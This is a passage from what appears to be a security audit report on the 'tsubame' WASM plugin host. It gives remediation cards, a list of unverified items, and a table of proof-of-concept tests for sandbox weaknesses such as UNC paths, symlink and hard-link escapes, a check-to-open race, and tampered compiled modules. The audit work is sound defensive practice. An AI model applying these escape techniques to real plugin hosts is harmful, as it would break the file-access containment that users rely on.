**Card J. Manifest hygiene** (PH-11, PH-21, PH-22). S. Cheap model. Done when
`ph11_*` flips.

**Card K. Release guard and crate split** (PH-20). S. Cheap model.
`release.ps1` fails over 1,572,864 B; `tsubame-plugc` moves to
`crates/tsubame-plugc` depending on `tsubame-plughost` with a `compile` API, so
no feature of the host package links Cranelift; `docs/wasm-plugins.md` and
`docs/PLAN.md` get the corrected size story.

**Card L. Containment tiers 2 and 3** (PH-07). L. Design task for the owner:
restricted token and low integrity, or AppContainer with a broker for `$input`.

## Unverified

- The exact command that produced the reported 9.31 MiB host.
- PH-08's 2 GiB: computed from the configured limits, not measured.
- PH-03 and PH-16 in the app: the app does not load plugins or consume preview
  buttons yet; the findings are about the documented wiring and the adapter
  contract.
- Whether command key chords from a manifest can shadow built-in shortcuts
  (the app parses them; not wired).
- Network traffic to a remote server and the WebDAV path for PH-01: only
  loopback SMB was exercised, on purpose.
- The junction-only variant of the PH-05 race (not won in 30 s) and an
  oplock-driven variant (not tried).
- Hard-link creation rights on current Windows (PH-06 planter requirements).
- Compile-time bombs against `tsubame-plugc` (PH-18).
- Orphan behaviour after an app crash, and 8.3 short names: by reading only.
- wasmtime itself, and published advisories for 50.0.2: out of scope and not
  looked up. Add `cargo audit` or `cargo deny` to the release checklist.

## Running the PoCs

```
cargo test -p tsubame-plughost --test security_poc -- --ignored --nocapture
cargo test -p tsubame-plughost --test host -- --ignored --nocapture ph0
```

All are `#[ignore]` and pass while the weakness exists. `ph04` and `ph05` need
the right to create symlinks (Developer Mode); they print `NOT RUN` otherwise.
`ph01` in `tests/host.rs` opens `\\127.0.0.1\C$` and nothing else.

| Test | File | Finding |
|---|---|---|
| `ph01_unc_paths_pass_the_policy_without_the_network_capability` | `tests/security_poc.rs` | PH-01 |
| `ph01_any_grant_makes_the_host_open_a_unc_path` | `tests/host.rs` | PH-01 |
| `ph03_a_modified_cwasm_with_a_matching_hash_is_deserialized_and_run` | `tests/host.rs` | PH-03 |
| `ph04_a_dangling_symlink_lets_write_file_create_a_file_outside_the_grant` | `tests/host.rs` | PH-04 |
| `ph05_swapping_a_file_for_a_link_between_check_and_open_reads_outside_the_grant` | `tests/host.rs` | PH-05 |
| `ph06_a_hard_link_reads_and_overwrites_a_file_outside_the_grant` | `tests/host.rs` | PH-06 |
| `ph09_superscript_device_names_are_accepted` | `tests/security_poc.rs` | PH-09 |
| `ph10_two_plugins_map_to_the_same_cwasm_name` | `tests/security_poc.rs` | PH-10 |
| `ph11_manifest_accepts_spoofing_characters_and_device_name_ids` | `tests/security_poc.rs` | PH-11 |
| `ph13_a_small_reply_makes_the_client_allocate_many_times_its_size` | `tests/security_poc.rs` | PH-13 |
| `ph14_unsolicited_frames_are_read_and_queued_without_limit` | `tests/security_poc.rs` | PH-14 |
| `ph15_status_blocks_behind_a_call_in_flight` | `tests/security_poc.rs` | PH-15 |
| `ph17_a_manifest_error_does_not_repeat_untrusted_input` (now a regression test, with the `ph16_*`, `ph13_b_*` and other `ph17_*` tests beside it) | `tests/security_poc.rs` | PH-17, PH-16, PH-13 b |
